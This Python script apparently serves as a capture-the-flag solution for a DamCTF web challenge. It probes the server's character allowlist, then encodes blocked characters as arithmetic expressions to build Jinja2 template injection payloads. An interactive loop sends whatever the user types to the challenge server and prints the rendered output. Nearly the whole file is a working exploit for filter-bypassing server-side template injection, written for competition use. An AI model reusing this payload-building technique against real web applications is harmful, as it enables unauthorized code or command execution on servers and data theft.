#! /usr/bin/env python3

import requests
import string
import re
from bs4 import BeautifulSoup as bs
from urllib.parse import unquote

filters_list = ['0', '2', '3', '5', '7', '8', '9', 'a', 'f', 'g', 'i', 'j', 'k', 'm', 'n', 'p', 'q', 's', 't', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '$', '%', ',', '.', '/', ':"', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '~', ' ', '\t', '\n', '\r', '\x0b', '\x0c"']
known = ['1', '4', '6', 'b', 'c', 'd', 'e', 'h', 'l', 'o', 'r', 'u', '"', '#', '&', "'", '(', ')', '*', '-', '{', '|', '}']

table = {
    '1':"'1'", 
    '4':"'4'", 
    '6':"'6'", 
    'b':"'b'", 
    'c':"'c'", 
    'd':"'d'", 
    'e':"'e'", 
    'h':"'h'", 
    'l':"'l'", 
    'o':"'o'", 
    'r':"'r'", 
    'u':"'u'", 
    '"':"'\"'", 
    '#':"'#'", 
    '&':"'&'", 
    "'":"\''\'", 
    '(':"'('", 
    ')':"')'", 
    '*':"'*'", 
    '-':"'-'", 
    '{':"'{'", 
    '|':"'|'", 
    '}':"'}'",
    'a': "(111-14)|ch",
    'f': "(6*(16+1))|ch",
    'g': "(111-6-1-1)|ch",
    'i': "(111-6)|ch",
    'j': "(111-4-1)|ch",
    'k': "(111-4)|ch",
    'm': "(111-1-1)|ch",
    'n': "(111-1)|ch",
    'p': "(111+1)|ch",
    'q': "(111+1+1)|ch",
    's': "(111+4)|ch",
    't': "(111+6-1)|ch",
    'v': "(114+4)|ch",
    'w': "(114+6-1)|ch",
    'x': "(16+4)|ch",
    'y': "(111+6+4)|ch",
    'z': "(114+6)|ch",
    '0': "(44+4)|ch",
    '2': "(44+6)|ch",
    '3': "(44+6+1)|ch",
    '5': "(46+6+1)|ch",
    '7': "(46+6+4-1)|ch",
    '8': "(46+6+4)|ch",
    '9': "(46+6+6-1)|ch",
    ".": "46|ch",
    "_": "(111-16)|ch",
    " ": "(44-6-6)|ch",
    "[": "(111-16-4)|ch",
    "]": "(111-14-4)|ch",
    "/": "(46+1)|ch",
    "\\": "((11+6+6)*4)|ch",
    "\t": "(6+4-1)|ch"

}

def get_filters():
    filters = []
    allowed = []
    for char in string.printable:
        r = requests.get(f"https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload={char}")
        if "Failed Allowlist Check" not in r.text:
            allowed.append(char)
            print(allowed)
        

def payload(cmd):
    cmd = list(cmd)
    for i in range(len(cmd)):
        cmd[i] = table[cmd[i]]

    result = "+".join(cmd)
    return re.sub(r"'\+'", "", result)

def urlencode(cmd):
    cmd = list(cmd)
    for i in range(len(cmd)):
        if cmd[i] == "+":
            cmd[i] = "%2B"
    return "".join(cmd)

while True:
    cmd = input("\n> ")
    if cmd == "exit":
        exit()
    exploit = payload(cmd)
    exploit_encoded = "{{(" + urlencode(exploit) + ")|e}}"
    length = len(unquote(exploit_encoded))

    r = requests.get(f"https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload={exploit_encoded}")
    if "Internal" in r.text:
        print("[-] Internal Server Error")
        continue
    soup = bs(r.text, 'html.parser')
    result = soup.find("code").find("p").contents[0]
    print(f'\x1b[34;1mLength: \x1b[37m{length}/161, {161 - length} chars left\x1b[0m)')
    print(f'\x1b[34;1mOutput: \033[37m{result}\x1b[0m')
